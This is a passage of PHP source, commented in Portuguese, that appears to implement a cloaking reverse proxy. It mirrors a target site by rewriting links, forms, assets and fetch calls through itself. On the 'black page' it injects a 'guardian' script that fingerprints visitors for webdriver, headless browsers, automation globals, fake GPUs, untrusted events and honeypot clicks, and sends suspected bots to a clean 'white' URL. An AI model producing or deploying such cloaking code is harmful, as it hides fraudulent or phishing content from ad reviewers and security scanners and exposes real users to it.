        $url = trim($url);
        if (preg_match('/^(data:|javascript:|mailto:|tel:|#)/i', $url)) {
            return $url;
        }
        $absolute = $makeAbsolute($url);
        return $proxyHost . '/?_asset=' . base64_encode($absolute);
    };
    
    // =============================================
    // REMOVE INTEGRITY E CROSSORIGIN (quebram CSS/JS reescritos)
    // =============================================
    $response = preg_replace('/\s+integrity=[\"\'][^\"\']*[\"\']/i', '', $response);
    $response = preg_replace('/\s+crossorigin(?:=[\"\'][^\"\']*[\"\'"])?/i', '', $response);
    
    // =============================================
    // REESCREVE CSS VIA PROXY (para corrigir fontes e @import)
    // =============================================
    $response = preg_replace_callback(
        '/<link([^>]*)(href=[\"\']([^\"\']+)[\"\'])([^>]*)>/is',
        function($m) use ($makeAssetProxy) {
            $attrs = $m[1] . $m[4];
            // Verifica se eh stylesheet
            if (stripos($attrs, 'stylesheet') !== false || preg_match('/\.css(\?|$)/i', $m[3])) {
                return '<link' . $m[1] . 'href="' . $makeAssetProxy($m[3]) . '"' . $m[4] . '>';
            }
            // Outros links (favicon, preload, etc) - URL absoluta direta
            return '<link' . $m[1] . 'href="' . $makeAssetProxy($m[3]) . '"' . $m[4] . '>';
        },
        $response
    );
    
    // Scripts: <script src="...">
    $response = preg_replace_callback(
        '/<script([^>]*)src=[\"\']([^\"\']+)[\"\']([^>]*)>/is',
        function($m) use ($makeAbsolute) {
            return '<script' . $m[1] . 'src="' . $makeAbsolute($m[2]) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // Imagens: <img src="...">
    $response = preg_replace_callback(
        '/<img([^>]*)src=[\"\']([^\"\']+)[\"\']([^>]*)>/is',
        function($m) use ($makeAbsolute) {
            return '<img' . $m[1] . 'src="' . $makeAbsolute($m[2]) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // Videos/Audio: <video src="...">, <source src="...">, <audio src="...">
    $response = preg_replace_callback(
        '/<(video|source|audio)([^>]*)src=[\"\']([^\"\']+)[\"\']([^>]*)>/is',
        function($m) use ($makeAbsolute) {
            return '<' . $m[1] . $m[2] . 'src="' . $makeAbsolute($m[3]) . '"' . $m[4] . '>';
        },
        $response
    );
    
    // Poster de video
    $response = preg_replace_callback(
        '/poster=[\"\']([^\"\']+)[\"\']/is',
        function($m) use ($makeAbsolute) {
            return 'poster="' . $makeAbsolute($m[1]) . '"';
        },
        $response
    );
    
    // Background em style inline: url(...)
    $response = preg_replace_callback(
        '/(style=[\"\'][^\"\']*?)url\s*\(\s*[\"\']?([^\"\'\)]+)[\"\']?\s*\)/is',
        function($m) use ($makeAbsolute) {
            $url = trim($m[2]);
            if (preg_match('/^(data:|#)/i', $url)) return $m[0];
            return $m[1] . 'url("' . $makeAbsolute($url) . '")';
        },
        $response
    );
    
    // Srcset
    $response = preg_replace_callback(
        '/srcset=[\"\']([^\"\']+)[\"\']/is',
        function($m) use ($makeAbsolute) {
            $srcset = $m[1];
            $parts = preg_split('/\s*,\s*/', $srcset);
            $newParts = [];
            foreach ($parts as $part) {
                if (preg_match('/^(.+?)(\s+\d+[wx])?$/i', trim($part), $pm)) {
                    $newParts[] = $makeAbsolute($pm[1]) . ($pm[2] ?? '');
                }
            }
            return 'srcset="' . implode(', ', $newParts) . '"';
        },
        $response
    );
    
    // Data-src, data-bg, etc (lazy loading)
    $response = preg_replace_callback(
        '/data-(?:src|bg|background|lazy-src|original|image)=[\"\']([^\"\']+)[\"\']/is',
        function($m) use ($makeAbsolute) {
            return 'data-src="' . $makeAbsolute($m[1]) . '"';
        },
        $response
    );
    
    // =============================================
    // REESCREVE LINKS <a href> PARA PROXY (URL LIMPA)
    // =============================================
    $response = preg_replace_callback(
        '/<a([^>]*)href=[\"\']([^\"\']+)[\"\']([^>]*)>/is',
        function($m) use ($makeProxyLink, $baseUrl) {
            $href = trim($m[2]);
            // Links externos (outros dominios) - abre direto
            if (preg_match('/^https?:\/\//i', $href) && strpos($href, $baseUrl) !== 0) {
                return $m[0];
            }
            return '<a' . $m[1] . 'href="' . $makeProxyLink($href) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // =============================================
    // REESCREVE FORMULARIOS PARA PROXY
    // =============================================
    $response = preg_replace_callback(
        '/<form([^>]*)action=[\"\']([^\"\']*)[\"\']([^>]*)>/is',
        function($m) use ($makeProxyLink) {
            $action = trim($m[2]);
            return '<form' . $m[1] . 'action="' . $makeProxyLink($action) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // =============================================
    // ADICIONA TAG <BASE> PARA RESOLVER RESTANTES
    // =============================================
    $baseTag = '<base href="' . $baseUrl . $basePath . '/">';
    if (stripos($response, '<head') !== false && stripos($response, '<base') === false) {
        $response = preg_replace('/(<head[^>]*>)/i', '$1' . "\n" . $baseTag, $response, 1);
    }
    
    // =============================================
    // SCRIPT PARA INTERCEPTAR NAVEGACAO DINAMICA
    // =============================================
    $proxyScript = '<script>
    (function(){
        var proxyBase = "' . $proxyHost . '/?_nav=";
        var assetBase = "' . $proxyHost . '/?_asset=";
        var targetBase = "' . $baseUrl . '";
        
        // Intercepta cliques em links
        document.addEventListener("click", function(e) {
            var link = e.target.closest("a");
            if (!link) return;
            
            var href = link.getAttribute("href");
            if (!href) return;
            
            if (/^(javascript:|mailto:|tel:|#|data:)/i.test(href)) return;
            if (href.indexOf("_nav=") !== -1) return;
            if (/^https?:\/\//i.test(href) && href.indexOf(targetBase) !== 0) return;
            
            var absolute = href;
            if (!/^https?:\/\//i.test(href)) {
                if (href.charAt(0) === "/") {
                    absolute = targetBase + href;
                } else {
                    absolute = targetBase + "/" + href;
                }
            }
            
            e.preventDefault();
            window.location.href = proxyBase + btoa(absolute);
        }, true);
        
        // Intercepta envio de formularios
        document.addEventListener("submit", function(e) {
            var form = e.target;
            var action = form.getAttribute("action") || "";
            
            if (action.indexOf("_nav=") !== -1) return;
            
            var absolute = action;
            if (!/^https?:\/\//i.test(action)) {
                if (action.charAt(0) === "/") {
                    absolute = targetBase + action;
                } else {
                    absolute = targetBase + "/" + action;
                }
            }
            
            form.setAttribute("action", proxyBase + btoa(absolute));
        }, true);
        
        // Intercepta fetch e XHR para APIs internas
        var originalFetch = window.fetch;
        window.fetch = function(url, options) {
            if (typeof url === "string" && !url.startsWith("data:") && !url.startsWith("blob:")) {
                if (url.indexOf("_nav=") === -1 && url.indexOf("_asset=") === -1) {
                    var absolute = url;
                    if (!/^https?:\/\//i.test(url)) {
                        if (url.charAt(0) === "/") {
                            absolute = targetBase + url;
                        } else {
                            absolute = targetBase + "/" + url;
                        }
                    }
                    // Apenas redireciona se for do mesmo dominio
                    if (absolute.indexOf(targetBase) === 0) {
                        url = assetBase + btoa(absolute);
                    }
                }
            }
            return originalFetch.call(this, url, options);
        };
        
        // Corrige historico do navegador
        if (window.history && window.history.replaceState) {
            window.history.replaceState({}, document.title, "' . $proxyHost . '/");
        }
    })();
    </script>';
    
    // =============================================
    // GUARDIAN - PROTECAO EXTRA PARA BLACK PAGE
    // Se detectar bot durante navegacao, redireciona para white
    // =============================================
    $guardianScript = '';
    if ($isBlackPage && !empty($whiteUrl)) {
        $guardianScript = '<script>
(function(){
    "use strict";
    var W="' . addslashes($whiteUrl) . '",S=0,T=Date.now(),R=false;
    function redir(r){if(R)return;R=true;try{location.replace(W)}catch(e){location.href=W}}
    function add(p,r){S+=p;if(Date.now()-T>2000&&S>=40)redir(r)}
    
    // Webdriver
    if(navigator.webdriver===true)add(50,"webdriver");
    
    // Headless
    if(/HeadlessChrome/i.test(navigator.userAgent))add(40,"headless");
    
    // Automation
    if(window.__puppeteer_evaluation_script__||window.puppeteer||window.__playwright||window.__selenium_unwrapped||window.__webdriver_evaluate||window.callPhantom||window._phantom||window.__nightmare)add(50,"automation");
    
    // Plugins
    if(!/Android|iPhone|iPad/i.test(navigator.userAgent)&&navigator.plugins.length===0)add(20,"no_plugins");
    
    // Languages
    if(!navigator.languages||navigator.languages.length===0)add(15,"no_lang");
    
    // SwiftShader
    try{var c=document.createElement("canvas"),g=c.getContext("webgl");if(g){var d=g.getExtension("WEBGL_debug_renderer_info");if(d&&/swiftshader|llvmpipe/i.test(g.getParameter(d.UNMASKED_RENDERER_WEBGL)))add(40,"fake_gpu")}}catch(e){}
    
    // Untrusted events
    var uc=0;
    function chk(e){if(e.isTrusted===false){uc++;if(uc>=3)add(25,"untrusted")}}
    document.addEventListener("mousemove",chk,{passive:true});
    document.addEventListener("click",chk,{passive:true});
    
    // Click speed
    var ct=[];
    document.addEventListener("click",function(){
        var n=Date.now();ct.push(n);if(ct.length>5)ct.shift();
        if(ct.length>=2&&ct[ct.length-1]-ct[ct.length-2]<80)add(35,"fast_click");
    },{passive:true});
    
    // Honeypot
    setTimeout(function(){
        var a=document.createElement("a");a.href="#hp";a.style.cssText="position:fixed;left:-9999px;opacity:0;pointer-events:auto";
        a.onclick=function(e){e.preventDefault();add(50,"honeypot")};document.body.appendChild(a);
    },500);
    
    // Final check
    setTimeout(function(){if(S>=40)redir("final")},5000);
})();
</script>';
    }
    
    // Injeta scripts antes de </body>
    $allScripts = $guardianScript . $proxyScript;
    if (stripos($response, '</body>') !== false) {
        $response = str_ireplace('</body>', $allScripts . '</body>', $response);
    } else {
        $response .= $allScripts;
    }
    
    // =============================================
    // HEADERS
    // =============================================
    header('HTTP/1.1 ' . $httpCode);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Access-Control-Allow-Origin: *');
    header_remove('Set-Cookie');
    header_remove('Transfer-Encoding');
    
    echo $response;
    exit;
}
